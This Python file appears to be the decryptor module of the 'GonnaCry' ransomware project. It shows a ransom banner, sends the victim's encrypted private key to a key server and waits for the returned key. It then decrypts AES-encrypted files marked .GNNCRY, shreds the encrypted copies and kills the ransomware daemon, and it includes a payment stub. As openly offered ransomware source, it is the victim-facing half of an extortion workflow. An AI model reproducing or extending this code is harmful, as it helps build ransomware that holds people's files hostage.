import environment
import symmetric
import utils

import subprocess
import requests
import base64
import string 
import random
import sys
import time
import os
import pickle

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


logo = """
  ▄████  ▒█████   ███▄    █  ███▄    █  ▄▄▄       ▄████▄   ██▀███ ▓██   ██▓
 ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █  ██ ▀█   █ ▒████▄    ▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒
▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒▓██  ▀█ ██▒▒██  ▀█▄  ▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░
░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░
░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██░   ▓██░ ▓█   ▓██▒▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░
 ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ 
  ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░░   ░ ▒░  ▒   ▒▒ ░  ░  ▒     ░▒ ░ ▒░▓██ ░▒░ 
░ ░   ░ ░ ░ ░ ▒     ░   ░ ░    ░   ░ ░   ░   ▒   ░          ░░   ░ ▒ ▒ ░░  
      ░     ░ ░           ░          ░       ░  ░░ ░         ░     ░ ░     
                                                 ░                 ░ ░    
    ALL YOUR FILES ARE ENCRYPTED WITH AES-CBC-256
    YOUR COMPUTER IS INFECTED WITH MALWARE THAT ENCRYPTED ALL YOUR IMPORTANT FILES
    THE ONLY WAY TO GET THEM BACK IS WITH THIS DECRYPTOR
"""


BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', \
                                                 '\33[93m', '\033[1;35m', '\033[1;32m', \
                                                  '\033[0m'

# environment paths
ransomware_name = ("gonnacry")
server_address = ("http://localhost:8000")
home = environment.get_home_path()
desktop = environment.get_desktop_path()
username = environment.get_username()
ransomware_path = os.path.join(home, ransomware_name)
machine_id = environment.get_unique_machine_id()


def kill_daemon():
    process = subprocess.Popen("pidof daemon", shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = process.stdout.read() + process.stderr.read()
    process2 = subprocess.Popen("pidof gonnacry", shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    pid_of_gonnacry = process2.stdout.read() + process2.stderr.read()
    
    process3 = subprocess.Popen("pidof python main.py", shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    pid_of_gonnacry2 = process3.stdout.read() + process3.stderr.read()
    try:
        pid_of_gonnacry2 = pid_of_gonnacry2.split(' ')[0]
    except: 
        pass

    os.system('kill -9 {}'.format(pid_of_gonnacry))
    os.system('kill -9 {}'.format(pid_of_gonnacry2))
    os.system('kill -9 {}'.format(output))
    os.system("killall daemon")
    os.system('killall gonnacry')
    os.system('killall ./gonnacry')
    os.system('killall ./daemon')


def decrypt_aes_keys(enc, key):
    key_obj = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key_obj)
    return cipher.decrypt(enc)


def send_to_server_encrypted_private_key(id, private_encrypted_key):
    try:
        ret = requests.post(server_address, data=private_encrypted_key)
    except Exception as e:
        raise e

    print("key decrypted")

    private_key = ret.text
    return str(private_key)


def payment():
    pass


def menu():
    print("{}Importing the encrypted client private key".format(WHITE))
    try:
        with open(os.path.join(ransomware_path, 'encrypted_client_private_key.key'),
                  'rb') as f:
            encrypted_client_private_key = pickle.load(f)
    except IOError:
        print("encrypted client private key not found, \
              I'm sorry. but all your files are lost!")
        sys.exit(-1)

    print("{}OK{}".format(GREEN, WHITE))

    key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))

    # send to server to be decrypted
    while True:
        try:
            print("Requesting to server to decrypt the private key")
            client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
            break
        except:
            print("{}No connection, sleeping for 2 minutes\nConnect \
                  to internet to get your files back!{}".format(RED, WHITE))
            time.sleep(120)

    # saving to disk the private key
    print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
    with open(os.path.join(ransomware_path, "client_private_key.PEM"), 'wb') as f:
        f.write(client_private_key)

    # GET THE AES KEYS and path
    try:
        with open(os.path.join(ransomware_path, "AES_encrypted_keys.txt")) as f:
            content = f.read()
    except IOError:
        print("AES keys not found. Sorry but all your files are lost!")
        sys.exit(-1)

    # get the aes keys and IV's and paths back
    print('Decrypting the files ...')
    content = content.split('\n')
    content.remove('')
    aes_and_path = []
    for line in content:
        ret = line.split(' ') # enc(KEY) base64(PATH)
        encrypted_aes_key = base64.b64decode(ret[0])
        aes_key = decrypt_aes_keys(encrypted_aes_key, client_private_key)

        aes_and_path.append((aes_key, base64.b64decode(ret[1])))

    for _ in aes_and_path:
        dec = symmetric.AESCipher(_[0])
        
        with open(_[1], 'rb') as f:
            encrypted_file_content = f.read()
        
        # decrypt content
        decrypted_file_content = dec.decrypt(encrypted_file_content)

        # save into new file without .GNNCRY extension
        old_file_name = _[1].replace(".GNNCRY", "")
        with open(old_file_name, 'w') as f:
            f.write(decrypted_file_content)
        
        # delete old encrypted file
        utils.shred(_[1])

    # end of decryptor
    print("{}Decryption finished!{}".format(GREEN, WHITE))

    # kill deamon running on bg
    kill_daemon()


if __name__ == "__main__": 
    print(logo)
    menu()
